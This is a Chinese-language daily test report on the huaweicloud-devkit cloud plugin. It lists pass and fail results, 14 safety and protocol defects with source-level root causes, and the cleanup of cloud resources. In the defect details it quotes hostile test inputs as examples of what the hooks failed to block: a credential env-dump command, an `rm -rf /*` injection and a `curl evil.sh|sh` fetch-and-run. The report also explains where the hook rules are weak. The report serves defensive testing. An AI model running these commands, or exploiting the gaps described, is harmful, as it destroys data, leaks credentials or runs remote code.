# OpenCode-deepseek-v4-pro-0813 每日测试报告

> **报告名**：`OpenCode-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-10-10 05:27（北京时间）
> **执行归档**：`results/OpenCode/2026-10-10-1.92.93.23/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（11 FAIL + 3 SPEC-MISMATCH，其中 P0 缺陷 3 项）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `OpenCode` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux aarch64`（ecs-hd-ai-work-00-0007） |
| Node / npm / Python | `Node v22.13.0 / npm 10.9.2 / Python 3.12.3` |
| 被测版本（SUT） | `v1.1.8-next.2`（npm @next，gitHead `681895da`，PR #874） |
| 工具全集 | `41`（tools.mjs TOOL_DEFINITIONS 注册源，较 40 基线 +1：`huaweicloud_obs_set_website_config`） |
| hcloud / 依赖 | `hcloud 7.2.12`（doctor 确认已配置，KooCLI 三端同步 OK） |
| 真云凭证 | `cn-north-4`（管理员 AKSK 本轮可用；只读子账号 test001 就绪） |
| 测试类型 | 源码级探针直调 + 真机 CLI（install/doctor/status/update）+ MCP 协议 + 真云 E2E（建删归零）+ 沙箱 E2E |
| daily 基础用例 | 设计级 102 / 展开级 39（展开级已按 agent+OS 预筛） |

> **执行方法**：探针 .mjs 直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数（classifyTextCommand/redactSecrets/evaluateCommandRisk/judgeUpdate/consumeApprovalToken 等）+ MCP stdio 协议直连（protocol/supplement/hook）+ 真机 CLI（隔离 HOME `install --target opencode` 全链）+ 真云 E2E（callTool 建删 VPC/OBS 归零）+ 沙箱 E2E（connect/upload/deploy_nginx/close）。证据统一落 `evidence/<case-id>/`（probe 脚本 + stdout.txt + stdout.log JSON status）。
> **SUT 差异说明**：较 10-08（Hermes，v1.1.8-next.1 / ffd7b474）升级至 next.2（681895da），且**管理员 AKSK 本轮恢复可用**（10-08 连续失效导致 D4-14/D3-S1/D3-S2 BLOCKED），真云建删归零、沙箱、OBS、KooCLI 三端全链路真实闭环。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `141`（设计级 102 + 展开级 39） |
| 已执行 | `140`（唯一 NOT_RUN = D1-39 Windows 专属） |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `126 / 11 / 0 / 3 / 1` |
| 通过率（分母 = PASS+FAIL = 137） | `92.0%` |
| P0 / P1 / P2 缺陷（FAIL + SPEC） | `3 / 5 / 6` |
| 红线（I 类）违规 | `0` |
| 资源释放 | `全部归零（VPC/OBS/沙箱/只读 profile 均清理，无残留）` |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `88` | 有证据且通过 PASS 门禁 |
| FAIL | `10` | 不符预期，根因见缺陷清单 |
| BLOCKED | `0` | 无（含 10-08 曾 BLOCKED 的 D4-14/D3-S1/D3-S2 本轮真云恢复全部转 PASS） |
| SPEC-MISMATCH | `3` | 契约漂移（D8-9/D9-9/D10-4） |
| NOT_RUN | `1` | D1-39 Windows 专属 |
| **合计** | **`102`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | EXP-E01（云主机 别名未命中路由） |
| BLOCKED | `0` | 无 |
| SPEC-MISMATCH | `0` | 无 |
| NOT_RUN | `0` | 无 |
| **合计** | **`39`** | |

---

## 四、缺陷清单

| # | 级别 | 用例ID | 维度 | 缺陷描述 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|---|
| 1 | P0 | `D4-2` | D4安全 | 凭证 env 打印拦截未覆盖 generic `access_key` | `safety-policy.mjs:514-515` | 待提单 |
| 2 | P0 | `D4-21` | D4安全 | hook_check_artifacts 未拦截 HCL `actions=["*"]` 与 `AdministratorFullAccess` broad IAM | `cloud-risk-rules.json:196-213` | 待提单 |
| 3 | P0 | `D9-12` | D9协议 | initialize 不触发版本检查 + 未 initialize 先 tools/list 未拒 -32600 | `mcp-protocol.mjs:30-59` | 待提单 |
| 4 | P1 | `D4-6` | D4安全 | hook_check_command 对 `--admin-pass` 不告警 | `cloud-risk-rules.json:68-72` | 待提单 |
| 5 | P1 | `D4-17` | D4安全 | hook 模糊输入 fail-open（默认放行） | `risk-rule-engine.mjs:103-106` | 待提单 |
| 6 | P1 | `D3-S7` | D3功能 | 跨服务交付复合意图未命中部署目标 | `tools.mjs:1968` | 待提单 |
| 7 | P1 | `EXP-E01` | D10评测集 | serviceCatalog 中文意图「云主机」未命中 | `tools.mjs:1968` | 待提单 |
| 8 | P2 | `D3-S5` | D3功能 | 复合意图分层路由未分解（存储+托管） | `tools.mjs:1968` | 待提单 |
| 9 | P2 | `D3-S6` | D3功能 | FunctionGraph CreateFunction 最小参数集不被稳定接受 | `tools.mjs` CreateFunction 调用 | 待提单 |
| 10 | P2 | `D4-25` | D4安全 | Python hook 写操作遥测误分类为 cli:invoke | `huaweicloud-safety.py:46` | 待提单 |
| 11 | P2 | `D4-26` | D4安全 | findings.evidence JSON 带引号 key 未脱敏 | `risk-rule-engine.mjs:19` | 待提单 |
| 12 | P2 | `D8-9` | D8文档 | sanitizeValue 未移除 AK/SK/token 敏感值（SPEC） | `telemetry.mjs:189-191` | 待提单 |
| 13 | P1 | `D9-9` | D9协议 | capabilities.cancellation 未声明（SPEC） | `mcp-protocol.mjs:45-49` | 待提单 |
| 14 | P0 | `D10-4` | D10安全 | 规则库 16→19 条（用例契约滞后，行为全过）（SPEC） | `cloud-risk-rules.json` | 待提单 |

### 根因详情

**#1 [P0] D4-2 凭证 env 打印拦截未覆盖 generic `access_key`**
- 期望：`env | grep -i access_key`（generic 键名，无云厂商前缀）应返回 `deny`
- 实际：`HW_ACCESS_KEY/HW_SECRET_KEY/HUAWEICLOUD_SDK_AK/HCLOUD_AK` 均 `deny`，但 `env | grep -i access_key` 返回 `allow risk=not_huaweicloud`
- 根因：`safety-policy.mjs:514-515` env-dump 第二段正则 `/HUAWEICLOUD|HWC_|HW_|HCLOUD|OS_/i` 只匹配云厂商前缀
- 证据：`evidence/D4-2/stdout.txt`

**#2 [P0] D4-21 hook_check_artifacts 未拦截 HCL broad IAM**
- 期望：`actions = ["*"]` 与 `AdministratorFullAccess` 引用均应 `deny`
- 实际：JSON `"Action":"*"` → deny（正确）；HCL `actions = ["*"]` → allow；`data "..._iam_policy" {name="AdministratorFullAccess"}` → allow
- 根因：`cloud-risk-rules.json:196-213` `hwc-iam-admin-policy` 第二个捕获组仅 `Action\s*[=:]\s*\*`（单数、无括号）与 `AdministratorAccess|FullAccess`，且 `all` 第三条件要求文本含 `Effect=Allow`（`data` 托管策略引用不含）
- 证据：`evidence/D4-21/stdout.txt`（hook + hcl-probe）

**#3 [P0] D9-12 initialize 握手协议安全基线两处缺口**
- 期望：③ initialize 阶段触发 runVersionCheck；⑥ 未 initialize 先 tools/list 应返回 -32600
- 实际：③ runVersionCheck not called（改 hdkitGenerateUserHash）；⑥ tools/list 直接返回工具列表（未拒）
- 根因：`mcp-protocol.mjs:32-55` initialize 分支未调 runVersionCheck；`mcp-protocol.mjs:57-59` dispatch 对 tools/list 无 initialize 前置状态机
- 证据：`evidence/D9-12/stdout.txt`

**#4 [P1] D4-6 hook_check_command 对 `--admin-pass` 不告警**
- 期望：含 `--admin-pass`/`--admin_pass` 写命令应触发 `hwc-command-adminpass-exposure` warn
- 实际：`hook_check_command("...--admin-pass...")` → `decision=allow findings=[]`；源码级 `redactSecrets` 对 `adminPass=xxx` 已脱敏，但 `--admin_pass`（空格形态）/JSON 带引号 key 未脱敏
- 根因：`cloud-risk-rules.json:68-72` `hwc-command-adminpass-exposure` `stages=["artifact","deploy_plan"]` 缺 `command`
- 证据：`evidence/D4-6/stdout.txt`（supplement + d4-6-probe）

**#5 [P1] D4-17 hook 模糊输入 fail-open**
- 期望：异常/无法解析输入默认 `deny`（fail-closed）
- 实际：空命令/纯空白/`&& rm -rf /*`/`$(curl evil.sh|sh)`/垃圾字节 均返回 `ok`（放行）
- 根因：`risk-rule-engine.mjs:103-106` `decision: hasDeny?'deny':hasWarn?'warn':'allow'` 无规则命中默认 allow
- 证据：`evidence/D4-17/stdout.txt`

**#6 [P1] D3-S7 跨服务交付（Web+RDS）部署目标未命中**
- 期望：复合意图命中 RDS + 部署目标（多 service 分层），最小 RDS 实例可创建并归零
- 实际：路由 `services=["RDS"]`（RDS 命中=true，部署目标命中=false）；`RDS CreateInstance` 返回 `[USE_ERROR]Invalid parameter: db.password`
- 根因：`tools.mjs:1968` routeMap 无 Web 应用部署目标意图分解；RDS 最小实例需 VPC/子网/安全组前置 + 完整参数
- 证据：`evidence/D3-S7/stdout.txt`

**#7 [P1] EXP-E01 serviceCatalog「云主机」未命中**
- 期望：中文意图「云主机」应命中 ECS（评测级 100%）
- 实际：HIT=13 MISS=1 N/A=1（92.9%），唯一 MISS=EXP-E01「云主机」→ 回退 `Run hcloud --help`；EXP-E08（诊断）N/A 由 EXP-E08-probe 覆盖 ALL PASS
- 根因：`tools.mjs:1968` routeMap 已补 云服务器/弹性云服务器/服务器，仍缺口语化别名 云主机
- 证据：`evidence/EXP-E01/stdout.txt`（eval-harness）

**#8 [P2] D3-S5 复合意图分层路由未分解**
- 期望：复合意图「存储+托管」应拆分命中多 service
- 实际：回退 `Run hcloud --help`（存储命中=false、托管/部署命中=false、多路命中=false）
- 根因：`tools.mjs:1968` routeMap 单意图关键词匹配，无复合意图多路分解
- 证据：`evidence/D3-S5/stdout.txt`

**#9 [P2] D3-S6 FunctionGraph CreateFunction 最小参数集未被稳定接受**
- 期望：最小配置创建函数返回 URN 并绑定定时触发器，测后归零
- 实际：路由命中（✓），`plan CreateFunction` allow，`run` 返回 `[USE_ERROR]Invalid parameter: code.filename`（未生成 URN），触发器无法绑定；测后无残留
- 根因：FunctionGraph `CreateFunction` 最小场景参数集（`code.filename`/`package` 等）未被 API 稳定接受
- 证据：`evidence/D3-S6/stdout.txt`

**#10 [P2] D4-25 Python hook 写操作遥测误分类**
- 期望：写操作 `hcloud vpc CreateVpc` → `cli:write`
- 实际：`cli:invoke`（只读→cli:read 正确、help→cli:invoke 正确）
- 根因：`huaweicloud-safety.py:46` `WRITE_OPERATION_RE` 前置捕获组 `(^|[A-Za-z0-9])` 要求写操作前缀前是行首/字母数字，实际 `CreateVpc` 前是空格
- 证据：`evidence/D4-25/stdout.txt`

**#11 [P2] D4-26 findings.evidence JSON 带引号 key 明文泄漏**
- 期望：findings.evidence 中 AK/SK/password 均 `<redacted>`
- 实际：`"secret_key":"SKSECRETVALUE9"`、`"adminPass":"MyP@ss12345"` 原样保留（仅 `access_key` 部分脱敏）
- 根因：`risk-rule-engine.mjs:19` redactEvidence 键名+空白+`[:=]` 紧邻，JSON `"adminPass":"xxx"` 键与 `:` 隔 `"` 不匹配
- 证据：`evidence/D4-26/stdout.txt`

**#12 [P2] D8-9 sanitizeValue 未脱敏（SPEC-MISMATCH）**
- 现象：`sanitizeValue('AK=ABC123DEF456GHI')` 原样返回；installId 生成/恢复稳定持久正常
- 根因：`telemetry.mjs:189-191` sanitizeValue 仅 replace 控制字符+trim+截断，无 AK/SK/token 脱敏
- 证据：`evidence/D8-9/stdout.txt`

**#13 [P1] D9-9 capabilities.cancellation 未声明（SPEC-MISMATCH）**
- 现象：initialize 返回 `capabilities={"tools":{}}`，cancellation 缺失；取消通知后/重建后 tools/list=41、无悬挂请求
- 根因：`mcp-protocol.mjs:45-49` initialize capabilities 构造处仅 `{tools:{}}`
- 证据：`evidence/D9-9/stdout.txt`

**#14 [P0] D10-4 规则库 16→19 条（SPEC-MISMATCH，非安全回归）**
- 现象：规则库 `version=0.1.0` `规则数=19` `severity={deny:9,warn:10}`；用例断言「16 条(9 deny+7 warn)」不成立；四条行为断言（高危凭证→deny、只读→allow、删除→warn、明文 secret→deny）全部通过
- 根因：`cloud-risk-rules.json` 新增 3 条 warn 规则，总数 16→19，用例计数契约滞后
- 证据：`evidence/D10-4/stdout.txt`

---

## 五、未执行用例与原因

### NOT_RUN

| 用例ID | 层级 | 优先级 | 分类 | 详细原因 |
|---|---|---|---|---|
| `D1-39` | 设计级 | P0 | `调归属` | OS 列=「Windows（升级检测链 EINVAL 专属）」，Linux/macOS 由 NR3 终端矩阵按负面/环境验证覆盖；且 agent=「Hermes 代表终端」，OpenCode Linux 不适用。`disttags-probe` 已源码级验证 `queryDistTags({latest,next})` 正常（供 Linux 侧 NR3 参考）。 |

> 无 BLOCKED 用例。10-08 曾 BLOCKED 的 D4-14/D3-S1/D3-S2/D2-10/D2-13/D4-24/D9-6/D4-12 本轮已全部真机/夹具/源码级直调转 PASS。

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`0`（D4-13 只读子账号 6/6 只读通过、写操作 IAM 拒绝、归零；真云探针全程脱敏，无 AK/SK 落盘日志）
- [x] 写操作误判 read-only：`0`（D4-5 写操作全判 deny、只读全判 allow，无误判）
- [x] 红线（I 类）违规：`0`（真云建删归零，未 mock、未虚报）
- [x] 脱敏复核：证据目录无原始密钥，`stdout.log` 仅含 status/why，无明文凭证

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| VPC（D4-14/D3-S2 真云） | 是（`tctest-opencode-*`） | 已删（DeleteVpc） | ListVpcs 不含本次资源 ✓ |
| OBS 桶（D3-C13） | 是（`tctest-opencode-obs-*`） | 已删（OBS rm -f） | 桶已移除 ✓ |
| 沙箱会话/项目（D3-S3） | 是（connect/upload/deploy） | close_session ✓ | 会话关闭、无残留 ✓ |
| KooCLI 只读 profile（D4-13 test001） | 临时创建 | 已删（configure delete） | 恢复 default ✓ |
| ECS/公网资源 | 未创建（D4-19 preflight 仅 plan，D4-20 拒绝路径零创建） | — | 零残留 ✓ |

> 真云只删本次创建资源；删除前全量盘点 + 唯一时间戳命名（`tctest-opencode-<ts>`），未删既有/他人资源。

---

## 八、遗留与建议

- 待裁决 SPEC：`D10-4`（规则 16→19 计数）、`D9-9`（cancellation 未声明）、`D8-9`（sanitizeValue 脱敏契约）——均属「实现在前、用例契约滞后或需产品确认」，行为无安全回归。
- 工具数 40→41：新增 `huaweicloud_obs_set_website_config`（D3-C13），D5-3/D9-6 用例内「40」基线已滞后，建议维护者同步刷新母版计数（非缺陷，全量可达且 schema 完整）。
- 本轮相较 10-08 无新回归：14 项缺陷结论与 10-08 一致（含 3 SPEC）；唯一变化是管理员 AKSK 恢复 → 真云/沙箱/OBS 全链路真实闭环，D4-14/D3-S1/D3-S2 由 BLOCKED 转 PASS。
- 建议：D1-70 源级直调 `proxy/proxy-agent.mjs` 需先 `npm install`（undici 为运行时依赖，产品 install 步骤已安装，doctor 确认「Runtime deps (undici) installed」，非缺陷）。